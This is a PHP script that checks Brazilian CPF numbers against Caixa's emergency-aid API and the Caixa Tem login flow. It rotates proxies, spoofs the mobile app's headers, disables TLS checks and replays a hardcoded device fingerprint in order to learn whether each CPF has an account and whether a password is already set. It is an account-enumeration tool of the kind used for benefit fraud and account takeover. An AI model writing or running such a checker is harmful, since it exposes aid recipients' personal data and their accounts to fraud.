<?php

   if (file_exists(getcwd()."/tmp/cookie.txt")) {
    unlink(getcwd()."/tmp/cookie.txt");
  }
function proxy(){
$proxy = file("proxys.txt");
$myproxy = rand(0,sizeof($proxy)-1);
$proxy = $proxy[$myproxy];
$proxy = substr($proxy, 0,(strlen($proxy)-1);
return $proxy;
}
$proxy = proxy();

function multiexplode ($delimiters,$string) {
  $resultado = str_replace($delimiters, $delimiters[0], $string);
  $resultado = explode($delimiters[0], $resultado);
  return  $resultado;
}

function getStr($string,$inicio,$fim){
  $string = explode($inicio, $string);
  $string = explode($fim, $string[1]);
  return $string[0];
}

  if (isset($_POST['cpf'])) {
  $cpf = $_POST['cpf'];
  $cpf = str_replace('-', '', $cpf);
  $cpf = str_replace('.', '', $cpf);
  $extract = preg_replace('<\W+>', " ", $cpf);
  $cpf = multiexplode(array(",","»","|",":"," ","/",";"), $extract);
  $cpf = $cpf[0];
  }

  $resto = substr($cpf, 1, 10);

  $inicio = substr($cpf,0,1);

  if ($inicio == '0'){
  $inicio = str_replace("0", "", $inicio);
  $cpf2 = $inicio.''.$resto;
  $inicio2 = substr($cpf2,0,1);
  if ($inicio2 == '0'){
  $resto = substr($cpf2, 1, 10);
  $inicio = str_replace("0", "", $inicio);
  $cpf2 = $inicio.''.$resto;
  $inicio2 = substr($cpf2,0,1);}
  if ($inicio2 == '0'){
  $resto = substr($cpf2, 1, 10);
  $inicio = str_replace("0", "", $inicio);
  $cpf2 = $inicio.''.$resto;
  $inicio2 = substr($cpf2,0,1);}
  if ($inicio2 == '0'){
  $resto = substr($cpf2, 1, 10);
  $inicio = str_replace("0", "", $inicio);
  $cpf2 = $inicio.''.$resto;
  }}
  else{$cpf2 = $cpf;}

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://auxilio.caixa.gov.br/api/CaixaTem');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
  curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
  curl_setopt($ch, CURLOPT_COOKIE, 1);
  #curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookie.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Content-Type: application/json; charset=utf-8',
  'Host: auxilio.caixa.gov.br',
  'Connection: Keep-Alive',
  'Accept-Encoding: gzip',
  'User-Agent: okhttp/3.4.1'));
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cpf":'.$cpf2.'}');  
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $resposta = curl_exec($ch);
  $dados = json_decode($resposta);
  $msg = getStr($resposta, '"mensagem":"', '"');
  $icCadun = getStr($resposta, 'icCadun":',',');
            
  if (strpos($resposta, 'Usuário liberado')) {

$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://login2.caixa.gov.br/auth/realms/internet/protocol/openid-connect/auth?redirect_uri=br.gov.caixa.tem%3A%2Foauth2Callback&client_id=cli-mob-nbm&response_type=code&login_hint=75583240920&state=XOKp2beM5bTHOwSQbSkMIg&scope=offline_access&code_challenge=JctvynV65yOqecbAnLC6VIKuZFBIsZJJ6y_ep4feFVs&code_challenge_method=S256&deviceId=4506156b-a7c0-3048-b2b0-04a11131ce9d&so=Android&app=br.gov.caixa.tem%3Bvertical%3Dhttps%3A%2F%2Fmobilidade.cloud.caixa.gov.br%3Bruntime%3Dmfp&origem=mf&nivel=10');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
  curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
  curl_setopt($ch, CURLOPT_COOKIE, 1);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookie.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: login2.caixa.gov.br',
  'Connection: keep-alive',
  'Cache-Control: max-age=0',
  'Upgrade-Insecure-Requests: 1',
  'Origin: https://login2.caixa.gov.br',
  'Content-Type: application/x-www-form-urlencoded',
  'Save-Data: on',
  'User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G955N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'Sec-Fetch-Site: same-origin',
  'Sec-Fetch-Mode: navigate',
  'Sec-Fetch-User: ?1',
  'Sec-Fetch-Dest: document',
  'Referer: https://login2.caixa.gov.br/auth/realms/internet/login-actions/authenticate?execution=8474e958-e12f-438b-8da6-73b4bb3574ff&client_id=cli-mob-nbm&tab_id=ivG2ZVVyuJ0',
  'Accept-Encoding: gzip, deflate, br'));
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $resposta = curl_exec($ch);

  $session = getStr($resposta, 'session_code=', '&');
  $execution = getStr($resposta, 'execution=', '&');
  $tabid = getStr($resposta, 'tab_id=', '"');

  curl_setopt($ch, CURLOPT_URL, 'https://login2.caixa.gov.br/auth/realms/internet/login-actions/authenticate?session_code='.$session.'&execution='.$execution.'&client_id=cli-mob-nbm&tab_id='.$tabid);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'f10=&fingerprint=db4a36ba1cf8126263e33b06c6a83ada&step=1&username='.$cpf);
  $resposta = curl_exec($ch);
  $resultado = array();
  if(strpos($resposta, 'Não existe cadastro para o CPF informado.')){
    $resultado['successCode'] = "Não cadastrado";
    echo json_encode($resultado);

    exit; 
  }else if(strpos($resposta, 'Informe sua senha:')){
    $resultado['erroCode'] = "Tem senha";
    echo json_encode($resultado);

    exit;
  }else{
    $resultado['erroCode'] = "Erro";
  echo json_encode($resultado);
    
  exit;
  }
  }
  else if (!empty($msg)){
    $resultado['erroCode'] = $msg;
  }
  echo json_encode($resultado);
?>
